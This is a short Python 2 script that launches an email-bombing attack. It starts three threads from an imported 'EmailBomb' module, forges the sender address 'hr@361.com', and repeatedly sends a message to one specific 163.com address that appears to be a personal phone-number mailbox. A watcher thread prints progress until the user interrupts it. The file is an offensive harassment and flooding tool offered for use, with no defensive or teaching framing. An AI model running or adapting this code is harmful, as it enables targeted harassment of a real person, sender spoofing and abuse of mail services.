# -*- coding: utf-8 -*-

import EmailBomb
import threading

thread_num = 3
exit_flag = 1

clients = [
    EmailBomb.EmailBomb(
        id=id,
        from_addr="hr@361.com",
        to_addr="15619047890@163.com",
    ) for id in range(thread_num)
]


def watcher():
    while exit_flag:
        for client in clients:
            print client.notify


thread = threading.Thread(target=watcher).start()

for client in clients:
    thread = threading.Thread(target=client.attack, args=("hello! my friend!", "hr: you got it!",))
    thread.start()


try:
    while 1:
        pass
except KeyboardInterrupt:
    exit_flag = 0
    for client in clients:
        client.exit_flag = exit_flag
